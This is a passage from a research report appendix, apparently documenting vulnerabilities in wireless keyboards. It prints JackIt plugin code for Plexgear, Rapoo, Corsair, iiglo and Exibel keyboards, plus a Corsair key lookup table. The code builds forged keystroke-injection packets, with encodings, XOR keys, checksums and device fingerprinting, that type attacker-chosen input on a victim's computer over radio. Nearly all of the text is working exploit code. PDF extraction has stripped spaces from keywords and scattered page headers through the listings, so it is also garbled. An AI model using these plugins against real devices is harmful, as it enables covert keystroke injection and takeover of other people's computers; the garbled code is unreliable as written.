”!”: [0x4d, 0xdb],
”\””:[0x45, 0xdb],
”#”: [0x7d, 0xdb],
”$”: [0x75, 0x0f],
”%”: [0x74, 0xdb],
”&”: [0x6c, 0xdb],
”’”: [0x16, 0],
”(”: [0x65, 0xdb],
”)”: [0x1d, 0xdb],
”*”: [0x16, 0xdb],
”+”: [0x14, 0],
”,”: [0x66, 0],
”-”: [0x17, 0],
”.”: [0xe1, 0],
”/”: [0x6d, 0xdb],
”0”: [0x15, 0],
”1”: [0x4d, 0],
”2”: [0x45, 0],
”3”: [0x7d, 0],
”4”: [0x75, 0],
”5”: [0x74, 0],
”6”: [0x6c, 0],
”7”: [0x6d, 0],
”8”: [0x65, 0],
”9”: [0x1d, 0],
”:”: [0x1e, 0xdb],
”;”: [0x66, 0xdb],
”<”: [0x41, 0],
”=”: [0x15, 0xdb],
”>”: [0x41, 0xdb],
”?”: [0x14, 0xdb],
”@”: [0x45, 0x0f],
”A”: [0x48, 0xdb],
”B”: [0x77, 0xdb],
”C”: [0x7e, 0xdb],
”D”: [0x78, 0xdb],
”E”: [0x7a, 0xdb],
Appendix A: Supporting material | 127
”F”: [0x70, 0xdb],
”G”: [0x71, 0xdb],
”H”: [0x69, 0xdb],
”I”: [0x62, 0xdb],
”J”: [0x68, 0xdb],
”K”: [0x60, 0xdb],
”L”: [0x18, 0xdb],
”M”: [0x6e, 0xdb],
”N”: [0x6f, 0xdb],
”O”: [0x1a, 0xdb],
”P”: [0x12, 0xdb],
”Q”: [0x4a, 0xdb],
”R”: [0x72, 0xdb],
”S”: [0x40, 0xdb],
”T”: [0x73, 0xdb],
”U”: [0x6a, 0xdb],
”V”: [0x76, 0xdb],
”W”: [0x42, 0xdb],
”X”: [0x46, 0xdb],
”Y”: [0x6b, 0xdb],
”Z”: [0x4e, 0xdb],
”[”: [0x65, 0x0f],
”\\”:[0x14, 0x0f],
”]”: [0x1d, 0x0f],
”^”: [0x63, 0xdb],
”_”: [0x17, 0xdb],
”‘”: [0x64, 0xdb],
”a”: [0x48, 0],
”b”: [0x77, 0],
”c”: [0x7e, 0],
”d”: [0x78, 0],
”e”: [0x7a, 0],
”f”: [0x70, 0],
”g”: [0x71, 0],
”h”: [0x69, 0],
”i”: [0x62, 0],
”j”: [0x68, 0],
”k”: [0x60, 0],
”l”: [0x18, 0],
”m”: [0x6e, 0],
”n”: [0x6f, 0],
”o”: [0x1a, 0],
”p”: [0x12, 0],
”q”: [0x4a, 0],
”r”: [0x72, 0],
”s”: [0x40, 0],
”t”: [0x73, 0],
”u”: [0x6a, 0],
”v”: [0x76, 0],
”w”: [0x42, 0],
”x”: [0x46, 0],
”y”: [0x6b, 0],
”z”: [0x4e, 0],
”{”: [0x6d, 0x0f],
”|”: [0x41, 0x0f],
”}”: [0x15, 0x0f],
”BACKSPACE”: [0x03, 0],
” ”: [0x39, 0],
”£”: [0x7d, 0x0f],
128 | Appendix A: Supporting material
”¤”: [0x75, 0xdb],
”§”: [0x4c, 0],
”«”: [0x4e, 0x0f],
”µ”: [0x6e, 0x0f],
”½”: [0xfc, 0xdb],
”Ä”: [0x11, 0xdb],
”Å”: [0x13, 0xdb],
”Ö”: [0x10, 0xdb],
”ß”: [0x40, 0x0f],
”ä”: [0x11, 0],
”å”: [0x13, 0],
”ð”: [0x78, 0x0f],
”ö”: [0x10, 0],
”þ”: [0x73, 0x0f],
”€”: [0x7a, 0x0f],
’’: [0, 0],
’ALT’: [0x09, 0],
’SHIFT’: [0xdb, 0],
’CTRL’: [0x54, 0],
’GUI’: [0xd3, 0],
4: [0x09, 0],
2: [0xdb, 0],
1: [0x54, 0],
8: [0xd3, 0],
’ENTER’: [0x06, 0],
’F12’: [0x07, 0],
’F10’: [0x05, 0],
’F9’: [0x04, 0],
’ESCAPE’: [0x49, 0],
’TAB’: [0x4b, 0],
’PRINTSCREEN’:[0x0d, 0],
’F2’: [0x7c, 0],
’CAPSLOCK’: [0x43, 0],
’F1’: [0x44, 0],
’F4’: [0x79, 0],
’F6’: [0x61, 0],
’F8’: [0x1c, 0],
’DOWNARROW’: [0x3f, 0],
’DELETE’: [0x3c, 0],
’RIGHT’: [0x37, 0],
’F3’: [0x7b, 0],
’DOWN’: [0x3f, 0],
’DEL’: [0x3c, 0],
’INSERT’: [0x34, 0],
’F5’: [0x55, 0],
’LEFTARROW’: [0x27, 0],
’RIGHTARROW’: [0x37, 0],
’PAUSE’: [0x52, 0],
’SPACE’: [0x39, 0],
’UPARROW’: [0x21, 0],
’F11’: [0x01, 0],
’F7’: [0x1b, 0],
’UP’: [0x21, 0],
’LEFT’: [0x27, 0],
’95’: [0x95, 0]
}
defchecksum(self, payload):
c = crc(poly=0x1021,preset=0xd83f)
Appendix A: Supporting material | 129
checksum = c.crcb(*payload[:-3])
payload[-3] = checksum & 0xff
payload[-2] = checksum >> 8
returnpayload
defkey_init(self):
payload = [0x00,0x5A,0x5A,0x5A,0x5A,0x00,0x00,0xff]
payload[0] = ( 2 + (self.count%14) ) ^ 0x1a
c = crc(poly=0x1021,preset=0x0cb2)
checksum = c.crcb(*payload[:-3])
payload[-3] = checksum & 0xff
payload[-2] = checksum >> 8
print(payload)
returnpayload
defkey_blank(self):
payload= [0xCA,0xB3,0x46,0xF4,0x5B,0xFF]
returnpayload
defkey_4b(self):
payload= [0x4B,0x78,0xFF]
returnpayload
defkey(self, payload, key, travel=0xdb):
ifkey[’char’]:
payload[0] = ( 2 + (self.count%14) ) ^ 0x2a
payload[1] = travel
payload[2] = self.mapping[key[’char’]][0]
returnpayload
defframe(self, travel, key={’hid’: 0, ’mod’: 0}):
returnself.checksum(self.key(self.payload_template[:], key, travel))
defbuild_frames(self, attack):
print(”building”)
modifiers = []
fori in range (0, len(attack)):
key = attack[i]
key[’frames’] = []
ifi == 0:
for_ in range (30):
key[’frames’].append([self.key_init(), 0])
key[’frames’].append([self.key_blank(),0])
self.count += 1
#if i == 0:
# for _ in range(20):
# key[’frames’].append([self.frame(0xdb,{’char’:’95’}),
,→ 8])
# key[’frames’].append([self.frame(0xdb,{’char’:’95’}),
,→ 8])
”””if key[’mod’]:
bit = 0x80
new_mods = []
while bit:
if bit & key[’mod’]:
130 | Appendix A: Supporting material
new_mods.append({’char’:bit & key[’mod’]})
print(new_mods)
bit = bit >> 1
for mod in modifiers:
if mod not in new_mods:
for _ in range(5):
key[’frames’].append([self.frame(0x5b,mod), 10])
modifiers.remove(mod)
for mod in new_mods:
if mod not in modifiers:
for _ in range(5):
key[’frames’].append([self.frame(0xdb,mod), 10])
modifiers.append(mod)
if not key[’mod’] and len(modifiers) > 0:
for mod in modifiers:
for _ in range(5):
key[’frames’].append([self.frame(0x5b,mod), 10])
modifiers.remove(mod)
”””
ifkey[’char’]:
for_ in range (5):
for_ in range (40):
key[’frames’].append([self.frame(0xdb,key), 0])
#self.count += 1
key[’frames’].append([self.key_blank(),0])
for_ in range (15):
key[’frames’].append([self.frame(0x5b,key), 0])
self.count += 1
key[’frames’].append([self.key_blank(),0])
key[’frames’].append([self.key_blank(),1])
key[’frames’].append([self.key_blank(),1])
self.count += 1
elifkey[’sleep’]:
count = int(key[’sleep’]) / 10
fori in range (0, int(count)):
key[’frames’].append([self.key_blank(), 10])
@classmethod
deffingerprint(cls, p):
#TODO if crc is correct
# Most likely plexgear
#return cls
returnNone
@classmethod
defdescription(cls):
return’Plexgear’
Appendix A: Supporting material | 131
A.3 Rapoo JackIt plugin
Listing A.3: Code to JackIt to enable automatic payload creation for the Rapoo
protocol
# -*- coding: utf-8 -*-
classHID( object):
’’’ Injection code for Rapoo keyboard ’’’
def__init__(self, address, payload):
self.address = address
self.device_vendor = ’Rapoo’
self.payload_template = [0x32,0x00,0x00]
defkeyup(self):
payload = [0x34,0x00]
returnpayload
defkey(self, payload, key):
payload[1] = key[’mod’]
payload[2] = key[’hid’]
returnpayload
defframe(self, key={’hid’: 0, ’mod’: 0}):
returnself.key(self.payload_template[:], key)
defbuild_frames(self, attack):
fori in range (0, len(attack)):
key = attack[i]
key[’frames’] = []
ifkey[’hid’] orkey[’mod’]:
key[’frames’].append([self.frame(key), 5])
key[’frames’].append([self.frame(key), 5])
key[’frames’].append([self.keyup(), 5])
elifkey[’sleep’]:
count = int(key[’sleep’]) / 10
fori in range (0, int(count)):
key[’frames’].append([self.keyup(), 10])
@classmethod
deffingerprint(cls, p):
print(p)
if len(p) > 2 andp[0] == 0x32 and(p[1] & 0xf0) == 0x00: # & with
,→ 0xf0 because you most often do not press right modifier keys
# Most likely rapoo
returncls
if len(p) == 2 andp[0] == 0x34 andp[1] == 0x00:
# Most likely rapoo
returncls
returnNone
@classmethod
defdescription(cls):
132 | Appendix A: Supporting material
return’Rapoo’
A.4 Corsair JackIt plugin
Listing A.4: Code to JackIt to enable automatic payload creation for the
Corsair protocol
# -*- coding: utf-8 -*-
importstruct
classHID( object):
’’’ Injection code for Corsair keyboard ’’’
def__init__(self, address, payload):
self.address = address
self.device_vendor = ’Corsair’
self.payload_template = 0x0
self.mapping = {
” ”: [0x0000000000000000000100000000000000000000, 0],
”!”: [0x0000200000000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”\””:[0x0000400000000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”#”: [0x0000800000000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”$”: [0x0000000100000000000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
”%”: [0x0000000200000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”&”: [0x0000000400000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”’”: [0x0000000000000000000000020000000000000000, 0],
”(”: [0x0000001000000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”)”: [0x0000002000000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”*”: [0x0000000000000000000000020000000000000000,
,→0x0000000000000001000000000000000000000000],
”+”: [0x0000008000000000000000000000000000000000, 0],
”,”: [0x0000000000000000020000000000000000000000, 0],
”-”: [0x0000000000000000080000000000000000000000, 0],
”.”: [0x0000000000000000040000000000000000000000, 0],
”/”: [0x0000000800000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”0”: [0x0000004000000000000000000000000000000000, 0],
”1”: [0x0000200000000000000000000000000000000000, 0],
”2”: [0x0000400000000000000000000000000000000000, 0],
”3”: [0x0000800000000000000000000000000000000000, 0],
”4”: [0x0000000100000000000000000000000000000000, 0],
”5”: [0x0000000200000000000000000000000000000000, 0],
”6”: [0x0000000400000000000000000000000000000000, 0],
”7”: [0x0000000800000000000000000000000000000000, 0],
”8”: [0x0000001000000000000000000000000000000000, 0],
”9”: [0x0000002000000000000000000000000000000000, 0],
Appendix A: Supporting material | 133
”:”: [0x0000000000000000040000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”;”: [0x0000000000000000020000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”<”: [0x0000000000000002000000000000000000000000, 0],
”=”: [0x0000004000000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”>”: [0x0000000000000002000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”?”: [0x0000008000000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”@”: [0x0000400000000000000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
”A”: [0x0000000000200000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”B”: [0x0000000000000040000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”C”: [0x0000000000000010000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”D”: [0x0000000000800000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”E”: [0x0000000008000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”F”: [0x0000000000000100000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”G”: [0x0000000000000200000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”H”: [0x0000000000000400000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”I”: [0x0000000000010000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”J”: [0x0000000000000800000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”K”: [0x0000000000001000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”L”: [0x0000000000002000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”M”: [0x0000000000000000010000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”N”: [0x0000000000000080000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”O”: [0x0000000000020000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”P”: [0x0000000000040000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”Q”: [0x0000000002000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”R”: [0x0000000010000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”S”: [0x0000000000400000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”T”: [0x0000000020000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”U”: [0x0000000080000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”V”: [0x0000000000000020000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”W”: [0x0000000004000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
134 | Appendix A: Supporting material
”X”: [0x0000000000000008000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”Y”: [0x0000000040000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”Z”: [0x0000000000000004000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”[”: [0x0000001000000000000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
”\\”:[0x0000008000000000000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
”]”: [0x0000002000000000000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
”^”: [0x0000000000000000000080000000000000000000,
,→0x0000000000000001000000000000000000000000],
”_”: [0x0000000000000000080000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”‘”: [0x0000000000000000000000100000000000000000,
,→0x0000000000000001000000000000000000000000],
”a”: [0x0000000000200000000000000000000000000000, 0],
”b”: [0x0000000000000040000000000000000000000000, 0],
”c”: [0x0000000000000010000000000000000000000000, 0],
”d”: [0x0000000000800000000000000000000000000000, 0],
”e”: [0x0000000008000000000000000000000000000000, 0],
”f”: [0x0000000000000100000000000000000000000000, 0],
”g”: [0x0000000000000200000000000000000000000000, 0],
”h”: [0x0000000000000400000000000000000000000000, 0],
”i”: [0x0000000000010000000000000000000000000000, 0],
”j”: [0x0000000000000800000000000000000000000000, 0],
”k”: [0x0000000000001000000000000000000000000000, 0],
”l”: [0x0000000000002000000000000000000000000000, 0],
”m”: [0x0000000000000000010000000000000000000000, 0],
”n”: [0x0000000000000080000000000000000000000000, 0],
”o”: [0x0000000000020000000000000000000000000000, 0],
”p”: [0x0000000000040000000000000000000000000000, 0],
”q”: [0x0000000002000000000000000000000000000000, 0],
”r”: [0x0000000010000000000000000000000000000000, 0],
”s”: [0x0000000000400000000000000000000000000000, 0],
”t”: [0x0000000020000000000000000000000000000000, 0],
”u”: [0x0000000080000000000000000000000000000000, 0],
”v”: [0x0000000000000020000000000000000000000000, 0],
”w”: [0x0000000004000000000000000000000000000000, 0],
”x”: [0x0000000000000008000000000000000000000000, 0],
”y”: [0x0000000040000000000000000000000000000000, 0],
”z”: [0x0000000000000004000000000000000000000000, 0],
”{”: [0x0000000800000000000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
”|”: [0x0000000000000002000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
”}”: [0x0000004000000000000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
”BACKSPACE”: [0x0000000000000000000000400000000000000000, 0],
” ”: [0x0000000000000000000100000000000000000000, 0],
”£”: [0x0000800000000000000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
”¤”: [0x0000000100000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”§”: [0x0000100000000000000000000000000000000000, 0],
”«”: [0x0000000000000004000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
Appendix A: Supporting material | 135
”µ”: [0x0000000000000000010000000000000000000000,
,→0x0000000000000000000800000000000000000000],
”½”: [0x0000100000000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”Ä”: [0x0000000000008000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”Å”: [0x0000000000080000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”Ö”: [0x0000000000004000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”ß”: [0x0000000000400000000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
”ä”: [0x0000000000008000000000000000000000000000, 0],
”å”: [0x0000000000080000000000000000000000000000, 0],
”ð”: [0x0000000000800000000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
”ö”: [0x0000000000004000000000000000000000000000, 0],
”þ”: [0x0000000020000000000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
”€”: [0x0000000008000000000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
’’: [0xCD01CA9DADAD39B03C7417E8F15701BB01172D39, 0],
’ALT’: [0, 0x0000000000000000400000000000000000000000],
’SHIFT’: [0, 0x0000000000000001000000000000000000000000],
’CTRL’: [0, 0x0000000000000000100000000000000000000000],
’GUI’: [0, 0x0000000000000000200000000000000000000000],
4: [0, 0x0000000000000000400000000000000000000000],
2: [0, 0x0000000000000001000000000000000000000000],
1: [0, 0x0000000000000000100000000000000000000000],
8: [0, 0x0000000000000000200000000000000000000000],
’SCROLLLOCK’: [0x0000000000000000000004000000000000000000, 0],
’ENTER’: [0x0000000000000000000000040000000000000000, 0],
’F12’: [0x0000000000000000000001000000000000000000, 0],
’HOME’: [0x0000000000000000000020000000000000000000, 0],
’F10’: [0x0000040000000000000000000000000000000000, 0],
’F9’: [0x0000020000000000000000000000000000000000, 0],
’ESCAPE’: [0x0001000000000000000000000000000000000000, 0],
’PAGEUP’: [0x0000000000000000000040000000000000000000, 0],
’TAB’: [0x0000000001000000000000000000000000000000, 0],
’PRINTSCREEN’:[0x0000000000000000000002000000000000000000, 0],
’F2’: [0x0004000000000000000000000000000000000000, 0],
’CAPSLOCK’: [0x0000000000100000000000000000000000000000, 0],
’F1’: [0x0002000000000000000000000000000000000000, 0],
’F4’: [0x0010000000000000000000000000000000000000, 0],
’F6’: [0x0040000000000000000000000000000000000000, 0],
’F8’: [0x0000010000000000000000000000000000000000, 0],
’DOWNARROW’: [0x0000000000000000000000004000000000000000, 0],
’DELETE’: [0x0000000000000000000000800000000000000000, 0],
’RIGHT’: [0x0000000000000000000000008000000000000000, 0],
’F3’: [0x0008000000000000000000000000000000000000, 0],
’DOWN’: [0x0000000000000000000000004000000000000000, 0],
’DEL’: [0x0000000000000000000000800000000000000000, 0],
’END’: [0x0000000000000000000000000100000000000000, 0],
’INSERT’: [0x0000000000000000000010000000000000000000, 0],
’F5’: [0x0020000000000000000000000000000000000000, 0],
’LEFTARROW’: [0x0000000000000000000000002000000000000000, 0],
’RIGHTARROW’: [0x0000000000000000000000008000000000000000, 0],
’PAGEDOWN’: [0x0000000000000000000000000200000000000000, 0],
’PAUSE’: [0x0000000000000000000008000000000000000000, 0],
136 | Appendix A: Supporting material
’SPACE’: [0x0000000000000000000100000000000000000000, 0],
’UPARROW’: [0x0000000000000000000000001000000000000000, 0],
’F11’: [0x0000080000000000000000000000000000000000, 0],
’F7’: [0x0080000000000000000000000000000000000000, 0],
’UP’: [0x0000000000000000000000001000000000000000, 0],
’LEFT’: [0x0000000000000000000000002000000000000000, 0]
}
defkey(self, payload, key):
ifkey[’char’]:
hid,mod = self.mapping[key[’char’]]
payload |= hid
payload |= mod
ifkey[’mod’]:
bit = 0x80
whilebit:
ifbit & key[’mod’]:
payload |= self.mapping[bit & key[’mod’]]
bit = bit >> 1
payload
payload ^= 0xCE01CA9DADAD39B03C7417E8F15701BB01172D39
payload =
,→ list(struct.unpack(”B”*20,payload.to_bytes(20,byteorder=”big”)))
returnpayload
defkeyup(self):
payload =
,→[0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00]
returnpayload
defframe(self, key={’hid’: 0, ’mod’: 0}):
returnself.key(self.payload_template, key)
defbuild_frames(self, attack):
fori in range (0, len(attack)):
key = attack[i]
key[’frames’] = []
ifkey[’hid’] orkey[’mod’]:
key[’frames’].append([self.frame(key), 5])
key[’frames’].append([self.frame(key), 5])
key[’frames’].append([self.frame(key), 5])
key[’frames’].append([self.frame(key), 5])
key[’frames’].append([self.frame(key), 5])
key[’frames’].append([self.keyup(), 5])
elifkey[’sleep’]:
count = int(key[’sleep’]) / 10
fori in range (0, int(count)):
key[’frames’].append([self.keyup(), 10])
@classmethod
deffingerprint(cls, p):
if len(p) == 20 and(p[0] == 0x03 orp[0] == 0xCE):
# Most likely corsair
Appendix A: Supporting material | 137
returncls
returnNone
@classmethod
defdescription(cls):
return’Corsair’
A.5 iiglo JackIt plugin
Listing A.5: Code to JackIt to enable automatic payload creation for the iiglo
protocol
# -*- coding: utf-8 -*-
frombinascii importcrc32
importrandom
fromjackit.plugins.crc importcrc
classHID( object):
’’’ Injection code for iiglo keyboard ’’’
def__init__(self, address, payload):
self.address = address
self.device_vendor = ’iiglo’
print(self.address)
print(self.address)
print(self.address)
self.preamble = [0xea,0xaa,0xaa]
self.payload_template = self.preamble + self.address[::-1] +
,→[0x12,0x12,0x12,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00]
#self.payload_template =
,→ [0x12,0x12,0x12,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00]
self.XOR_key = [0xF5,0x3B,0x0D,0x6D,0x2A,0xF9,0xBC,0x00,0x00]
# self.count = 0
# self.count2 = 0
defchecksum(self, payload):
#payload[len(payload)-len(self.XOR_key)-2] =
,→ payload[len(payload)-len(self.XOR_key)-2] |
,→ ((random.randint(0, 15) & 0x3) << 1)
#payload[len(payload)-len(self.XOR_key)-1] =
,→ payload[len(payload)-len(self.XOR_key)-1] |
,→ (random.randint(0, 15) & 0xf)
c = crc(poly=0x1021,preset=0xde60)
checksum = c.crcb(*(payload[ len(self.preamble):-2]))
payload[-1] = checksum & 0xff
payload[-2] = checksum >> 8
returnpayload
defxor(self,payload):
padded_XOR_key = ( len(payload)- len(self.XOR_key))*[0x00]+self.XOR_key
138 | Appendix A: Supporting material
return[i^j fori,j in zip(payload,padded_XOR_key)]
defkey(self, payload, key):
payload[ len(payload)- len(self.XOR_key)] = key[’mod’]
payload[ len(payload)- len(self.XOR_key)+1] = key[’hid’]
returnpayload
defframe(self, key={’hid’: 0, ’mod’: 0}):
returnself.checksum(self.xor(self.key(self.payload_template[:],
,→key)))
defbuild_frames(self, attack):
fori in range (0, len(attack)):
key = attack[i]
key[’frames’] = []
ifi == 0:
for_ in range (5):
key[’frames’].append([self.frame(), 5])
ifkey[’hid’] orkey[’mod’]:
fori in range (10):
key[’frames’].append([self.frame(key), 1])
#self.count2 += 5
#self.count += 4
key[’frames’].append([self.frame(), 5])
elifkey[’sleep’]:
count = int(key[’sleep’]) / 10
fori in range (0, int(count)):
key[’frames’].append([self.frame(), 10])
@classmethod
deffingerprint(cls, p):
#TODO if crc is correct or 4b78 after address
# Most likely plexgear
#return cls
returncls
@classmethod
defdescription(cls):
return’iiglo’
A.6 Exibel JackIt plugin
Listing A.6: Code to JackIt to enable automatic payload creation for the Exibel
protocol
# -*- coding: utf-8 -*-
classHID( object):
’’’ Injection code for Exibel keyboard ’’’
Appendix A: Supporting material | 139
def__init__(self, address, payload):
self.address = address
self.device_vendor = ’Exibel’
self.payload_template = [0x00]*11
defchecksum(self, payload):
payload[-1] = 0xff & sum(payload[0:-1])
returnpayload
defkey(self, payload, key):
payload[0] = key[’mod’]
payload[1] = key[’hid’]
returnpayload
defframe(self, key={’hid’: 0, ’mod’: 0}):
returnself.checksum(self.key(self.payload_template[:], key))
defbuild_frames(self, attack):
fori in range (0, len(attack)):
key = attack[i]
key[’frames’] = []
ifi == 0:
for_ in range (5):
key[’frames’].append([self.frame(), 5])
ifkey[’hid’] orkey[’mod’]:
key[’frames’].append([self.frame(key), 5])
key[’frames’].append([self.frame(), 5])
elifkey[’sleep’]:
count = int(key[’sleep’]) / 10
fori in range (0, int(count)):
key[’frames’].append([self.frame(), 10])
@classmethod
deffingerprint(cls, p):
if len(p) == 11 and(0xff & sum(p[0:-1])) == p[-1]:
# Most likely exibel
returncls
returnNone
@classmethod
defdescription(cls):
return’Exibel’
140 | Appendix A: Supporting material
A.7 Corsair lookup table
Listing A.7: Corsair lookup table.
” ”: [0x0000000000000000000100000000000000000000, 0],
”!”: [0x0000200000000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”\””:[0x0000400000000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”\#”: [0x0000800000000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”\$”: [0x0000000100000000000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
”\%”: [0x0000000200000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”\&”: [0x0000000400000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”’”: [0x0000000000000000000000020000000000000000, 0],
”(”: [0x0000001000000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”)”: [0x0000002000000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”*”: [0x0000000000000000000000020000000000000000,
,→0x0000000000000001000000000000000000000000],
”+”: [0x0000008000000000000000000000000000000000, 0],
”,”: [0x0000000000000000020000000000000000000000, 0],
”-”: [0x0000000000000000080000000000000000000000, 0],
”.”: [0x0000000000000000040000000000000000000000, 0],
”/”: [0x0000000800000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”0”: [0x0000004000000000000000000000000000000000, 0],
”1”: [0x0000200000000000000000000000000000000000, 0],
”2”: [0x0000400000000000000000000000000000000000, 0],
”3”: [0x0000800000000000000000000000000000000000, 0],
”4”: [0x0000000100000000000000000000000000000000, 0],
”5”: [0x0000000200000000000000000000000000000000, 0],
”6”: [0x0000000400000000000000000000000000000000, 0],
”7”: [0x0000000800000000000000000000000000000000, 0],
”8”: [0x0000001000000000000000000000000000000000, 0],
”9”: [0x0000002000000000000000000000000000000000, 0],
”:”: [0x0000000000000000040000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”;”: [0x0000000000000000020000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”<”: [0x0000000000000002000000000000000000000000, 0],
”=”: [0x0000004000000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”>”: [0x0000000000000002000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”?”: [0x0000008000000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”@”: [0x0000400000000000000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
”A”: [0x0000000000200000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”B”: [0x0000000000000040000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”C”: [0x0000000000000010000000000000000000000000,
Appendix A: Supporting material | 141
,→0x0000000000000001000000000000000000000000],
”D”: [0x0000000000800000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”E”: [0x0000000008000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”F”: [0x0000000000000100000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”G”: [0x0000000000000200000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”H”: [0x0000000000000400000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”I”: [0x0000000000010000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”J”: [0x0000000000000800000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”K”: [0x0000000000001000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”L”: [0x0000000000002000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”M”: [0x0000000000000000010000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”N”: [0x0000000000000080000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”O”: [0x0000000000020000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”P”: [0x0000000000040000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”Q”: [0x0000000002000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”R”: [0x0000000010000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”S”: [0x0000000000400000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”T”: [0x0000000020000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”U”: [0x0000000080000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”V”: [0x0000000000000020000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”W”: [0x0000000004000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”X”: [0x0000000000000008000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”Y”: [0x0000000040000000000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”Z”: [0x0000000000000004000000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”[”: [0x0000001000000000000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
”\\”:[0x0000008000000000000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
”]”: [0x0000002000000000000000000000000000000000,
,→0x0000000000000000000800000000000000000000],
”\^”: [0x0000000000000000000080000000000000000000,
,→0x0000000000000001000000000000000000000000],
”\_”: [0x0000000000000000080000000000000000000000,
,→0x0000000000000001000000000000000000000000],
”‘”: [0x0000000000000000000000100000000000000000,
